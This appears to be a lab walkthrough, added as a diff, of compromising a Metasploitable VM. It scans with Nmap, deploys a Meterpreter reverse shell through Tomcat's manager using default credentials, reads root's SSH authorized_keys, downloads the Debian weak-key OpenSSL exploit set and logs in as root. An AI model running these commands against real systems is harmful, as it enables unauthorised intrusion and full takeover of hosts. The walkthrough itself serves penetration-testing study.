@@ -1,0 +1,73 @@
+In Armitage launch db_nmap -sV 10.10.15.4 (ip of metasploitable)
+
+...
+[*] Nmap: 8180/tcp open http	Apache Tomcat/Coyote JSP engine 1.1
+...
+
+We found that the tcp port 8180 is open and used by Apache Tomcat
+
+msf5 > use exploit/multi/http/tomcat_mgr_deploy
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set password tomcat
+password => tomcat
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set username tomcat
+username => tomcat
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set RHOST 10.10.15.4
+RHOST => 10.10.15.4
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set LPORT 9999
+LPORT => 9999
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf5 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD java/meterpreter/reverse_tcp
+PAYLOAD => java/meterpreter/reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit
+
+Now we can open a console on the victim
+
+$ whoami
+tomcat55
+
+Thanks to the PAYLOAD we used, we also have a meterpreter session on our victim
+
+$ cd root
+$ ls -la .ssh
+total 16
+drwxr-xr-x	2 	root root 4096 2012-05-20 14:21 .
+drwxr-xr-x 	13 	root root 4096 2020-05-02 08:05 ..
+-rw-r--r-- 	1	root root  405 2010-05-17 21:44 authorized_keys
+-rw-r--r--	1	root root  442 2012-05-20 14:21 known_hosts
+
+$ cat .ssh/authorized_keys
+ssh-rsa
+AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0i (...)
+ msfadmin@metasploitable
+
+Download and extract on the attacker machine the openssl exploit from:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
+The content is in /Desktop/rsa/2048
+
+marco@kali:~/Desktop/rsa/2048$ grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0i (...)
+57c3115d77c56390332dc5c49978627a-5429.pub
+
+Now we can try to gain root access via ssh
+
+marco@kali:~/Desktop/rsa/2048$ ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.15.4
+Last login: Sat May	2 08:05:21 2020 from :0.0
+Linux metasploitable	2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have mail.
+
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
